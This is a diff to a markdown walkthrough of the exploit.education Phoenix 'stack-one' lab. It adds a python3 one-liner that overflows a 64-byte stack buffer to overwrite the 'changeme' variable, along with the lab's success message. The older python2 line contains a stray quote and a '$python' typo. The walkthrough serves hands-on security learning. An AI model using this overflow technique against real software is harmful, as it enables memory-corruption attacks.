@@ -49,16 +49,28 @@ Since we know there is a buffer size of 64 before we write to the changeme addre
 python -c 'print "A" * 64 + "\x62\x59\x6c\x49"'
 ```
 
+
+
 The above will print 64 A's followed by the little-endian address.  
 
 We can pass this to the stack-one executable as such:  
 
+
+__python__
 ```bash
 ./stack-one $($python -c 'print "A" * 64" + "\x62\x59\x6c\x49"')
 
 Welcome to phoenix/stack-one, brought to you by https://exploit.education
 Well done, you have successfully set changeme to the correct value  
 ```
+
+__python3__
+```bash
+./stack-one $(python3 -c 'print("A"*64 + "\x62\x59\x6c\x49")')
+Welcome to phoenix/stack-one, brought to you by https://exploit.education
+Well done, you have successfully set changeme to the correct value
+```
+
 
 
 
